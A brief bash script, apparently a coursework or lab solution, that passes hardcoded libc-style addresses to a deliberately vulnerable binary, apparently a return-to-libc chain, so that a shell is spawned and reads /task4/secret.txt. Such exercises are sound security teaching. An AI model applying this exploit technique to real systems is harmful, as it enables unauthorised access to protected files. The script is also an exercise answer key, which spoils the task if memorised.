#!/usr/bin/env bash
echo /bin/cat /task4/secret.txt | env -i SHELL=/bin/sh /task4/s1813674/vuln \
  "$(python -c "print('\x10\xee\xe1\xf7' + '\x60\x20\xe1\xf7' + '\x8f\xd8\xf5\xf7')")" 1124
